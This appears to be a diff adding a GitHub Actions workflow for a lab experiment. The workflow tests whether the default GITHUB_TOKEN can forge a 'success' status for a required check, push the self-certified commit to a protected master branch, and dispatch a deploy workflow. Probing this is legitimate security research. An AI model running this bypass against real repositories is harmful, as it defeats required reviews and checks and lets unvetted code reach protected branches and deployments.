@@ -1,0 +1,83 @@
+name: exp1-bypass
+# Experiment 1E: does the job's own `Statuses: write` let the automatic GITHUB_TOKEN
+# satisfy the required status check it is being blocked by, and then land the push?
+# Again: no `permissions:` block, so the default workflow permission applies.
+on:
+  workflow_dispatch:
+    inputs:
+      label:
+        description: 'configuration label'
+        required: true
+        default: 'E'
+
+jobs:
+  bypass_push:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Read the required contexts from the public protection summary
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          curl -sS -H "Authorization: Bearer $GH_TOKEN" \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/branches/master" \
+            | python3 -c 'import json,sys;d=json.load(sys.stdin);print("REQUIRED_CONTEXTS:",d["protection"]["required_status_checks"]["contexts"])'
+
+      - name: Build a commit, publish it on a side branch, self-certify it, then push master
+        env:
+          LABEL: ${{ inputs.label }}
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          git config user.name  "ci-lab-bot"
+          git config user.email "ci-lab-bot@users.noreply.github.com"
+          mkdir -p probe
+          printf 'run=%s config=%s at=%s\n' "$GITHUB_RUN_ID" "$LABEL" "$(date -u +%FT%TZ)" \
+            > "probe/bypass-${GITHUB_RUN_ID}.txt"
+          git add probe
+          git commit -q -m "exp1E self-certified commit (${GITHUB_RUN_ID})"
+          SHA=$(git rev-parse HEAD)
+          echo "CANDIDATE_SHA=$SHA"
+
+          echo "--- step 1: push the commit to a side branch (unprotected) ---"
+          git push origin "HEAD:refs/heads/probe/bypass-${GITHUB_RUN_ID}" > p1.txt 2>&1
+          echo "SIDE_BRANCH_PUSH_EXIT=$?"; cat p1.txt
+
+          echo "--- step 2: create a commit status for the required context using the job's own token ---"
+          printf '{"state":"success","context":"Build_storybook","description":"self-certified by the workflow token","target_url":"https://github.com/%s/actions/runs/%s"}' \
+            "$GITHUB_REPOSITORY" "$GITHUB_RUN_ID" > st.json
+          curl -sS -w '\nHTTP_STATUS=%{http_code}\n' -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            --data-binary @st.json \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/statuses/${SHA}" \
+            | python3 -c 'import sys;t=sys.stdin.read();import re;print(t[:600])'
+
+          echo "--- step 3: combined status for the candidate commit ---"
+          curl -sS -H "Authorization: Bearer $GH_TOKEN" \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/commits/${SHA}/status" \
+            | python3 -c 'import json,sys;d=json.load(sys.stdin);print("state=",d["state"],"contexts=",[(s["context"],s["state"],s["creator"]["login"]) for s in d["statuses"]])'
+
+          echo "--- step 4: push the self-certified commit to master ---"
+          git push origin HEAD:master > p4.txt 2>&1
+          rc=$?
+          echo "=== BEGIN VERBATIM GIT PUSH OUTPUT (config ${LABEL}) ==="
+          cat p4.txt
+          echo "=== END VERBATIM GIT PUSH OUTPUT ==="
+          echo "PUSH_EXIT_STATUS=${rc}"
+          echo "=== remote refs/heads/master after the attempt ==="
+          git ls-remote origin refs/heads/master
+          echo "EXPECTED_SHA=$SHA"
+          exit 0
+
+      - name: Attempt workflow_dispatch of the deploy workflow with the same token
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          echo "--- dispatch exp3-deploy.yml on master using GITHUB_TOKEN ---"
+          curl -sS -w '\nHTTP_STATUS=%{http_code}\n' -X POST \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            -d '{"ref":"master"}' \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/exp3-deploy.yml/dispatches"
+          exit 0
